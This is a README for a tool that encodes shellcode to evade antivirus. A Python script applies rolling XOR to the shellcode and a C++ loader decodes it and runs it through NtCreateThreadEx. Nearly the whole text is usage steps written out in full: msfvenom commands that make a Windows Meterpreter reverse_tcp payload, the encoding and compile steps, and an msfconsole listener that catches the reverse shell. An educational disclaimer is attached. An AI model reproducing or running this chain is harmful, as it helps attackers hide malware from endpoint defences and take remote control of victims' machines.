# Shellcode Encoder and Executor (Bypass-AV)

Encodes and executes shellcode to test AV evasion, inspired by [EngWang/bypass-AV](https://github.com/EngWang/bypass-AV). Uses a Python script for rolling XOR encoding and a C++ program for decoding and execution on Windows (x64).

**Warning**: For educational/research use only. Unauthorized use is illegal. Test in a controlled environment.

## Files
- `xor_encoder.py`: Encodes `shellcode.bin` to `shellcode.enc` using rolling XOR (key: `0xAA`).
- `bypass.cpp`: Decodes `data.enc`, allocates executable memory, and runs shellcode via `NtCreateThreadEx`.

## Prerequisites
- Python 3.x
- Metasploit (`msfvenom`)
- Windows x64, Visual Studio/MinGW
- Admin privileges

## Usage

1. **Generate Shellcode**:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o shellcode.bin
   ```

2. **Encode Shellcode**:
   ```bash
   python xor_encoder.py
   ```
   Outputs `shellcode.enc`.

3. **Execute Shellcode**:
   - Rename `shellcode.enc` to `data.enc` or update path in `bypass.cpp`.
   - Compile (x64):
     ```bash
     g++ bypass.cpp -o bypass.exe -lpsapi
     ```
   - Set up Metasploit listener:
     ```bash
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST=<your_ip>; set LPORT=<your_port>; exploit"
     ```
   - Run:
     ```bash
     bypass.exe
     ```

## Notes
- Edit XOR key (`0xAA`) in both scripts (must match).
- Update file paths as needed.
- Test in a VM; AV may block execution.
- Debug with x64dbg/Process Monitor if issues occur.


